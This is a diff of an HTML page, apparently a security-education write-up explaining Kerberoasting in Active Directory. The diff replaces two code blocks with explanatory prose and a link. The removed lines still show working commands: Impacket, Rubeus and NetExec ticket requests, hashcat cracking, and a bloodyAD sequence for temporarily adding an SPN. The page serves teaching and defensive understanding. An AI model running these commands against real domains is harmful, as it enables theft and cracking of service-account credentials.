@@ -118,25 +118,12 @@
           traffic at all.
         </p>
 
-        <h2>The commands</h2>
-
-        <pre><code># Impacket — from Linux, with any domain credential
-GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:Passw0rd \
-  -outputfile kerberoast.hash
-
-# Rubeus — from a domain-joined Windows host
-Rubeus.exe kerberoast /outfile:kerberoast.hash
-
-# NetExec
-netexec ldap 10.10.10.10 -u jdoe -p Passw0rd --kerberoasting kerberoast.hash
-
-# Crack it
-hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt</code></pre>
-
         <p>
-          Hashcat mode <strong>13100</strong> is the Kerberoast (TGS-REP) mode. The tools
+          The tools that perform this — Impacket's GetUserSPNs, Rubeus, and NetExec — all
           request RC4-encrypted tickets where possible, because RC4 (etype 23) cracks far
-          faster than AES.
+          faster than AES. The full exploitation walkthrough, with commands, is in the
+          <a href="../vulns.html">Vulns &amp; Misconfigs</a> section under <em>Kerberoasting</em>;
+          this page is the mechanism behind it.
         </p>
 
         <h2>Why the encryption type matters so much</h2>
@@ -164,13 +151,10 @@ hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt</code></pre>
           A variant worth knowing: if you have write access to an account (via an
           <a href="2026-08-18-acls-dacls.html">ACL</a>), you can <em>add</em> an SPN to it,
           roast it, then remove the SPN. This turns any writable account into a roastable
-          one on demand, and it is a common BloodHound-identified path.
+          one on demand, and it is a common BloodHound-identified path. It is the point where
+          an <a href="2026-08-18-acls-dacls.html">ACL</a> weakness converts into a crackable
+          credential — the write primitive and the roast primitive meeting on one account.
         </p>
-
-        <pre><code># add an SPN, roast, clean up
-bloodyAD -u jdoe -p pass -d corp.local set object svc_target servicePrincipalName -v "fake/svc"
-GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:pass
-bloodyAD -u jdoe -p pass -d corp.local set object svc_target servicePrincipalName -v ""</code></pre>
 
         <h2>Detection and defence</h2>
 
